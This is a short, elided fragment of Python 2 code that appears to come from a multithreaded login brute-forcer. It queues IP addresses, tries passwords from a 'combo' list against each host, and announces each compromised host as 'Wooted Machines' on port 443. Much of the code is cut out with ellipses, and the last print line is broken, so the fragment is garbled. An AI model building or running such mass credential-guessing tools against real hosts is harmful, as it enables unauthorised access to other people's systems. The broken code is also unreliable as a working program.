...
for ip in ips:
    queue_count += 1
    stdout.write("\r\033[37m[\033[35m%d\033[37m] Added to queue" % queue_count)
    stdout.flush()
    queue.put(ip)
print "\n"
    ...
    def run(self):
        ...
        for passwd in combo:
            ...
            try:
                ...
                if success == True:
                    try:
                        print "\033[37m[\033[35m!\033[37m] \033[35mWooted Machines \033[37m-> \033[35m%s\033[37m:\033[35m443(self.ip)
